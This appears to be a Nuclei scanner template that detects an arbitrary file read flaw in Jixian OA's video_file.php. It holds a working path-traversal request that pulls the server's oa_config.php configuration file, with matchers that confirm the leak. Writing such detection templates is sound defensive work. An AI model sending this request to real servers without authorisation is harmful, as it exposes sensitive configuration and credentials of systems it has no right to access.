id: jixianOA-videofile-file-read
info:
  name: 极限OA video_file.php 任意文件读取漏洞
  author: cnaq
  severity: medium
  description: 极限OA video_file.php存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感文件
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E6%9E%81%E9%99%90OA/%E6%9E%81%E9%99%90OA%20video_file.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
  tags: jixianOA,file,read,video_file
requests:
  - raw:
      - |
        GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - '$ROOT_PATH'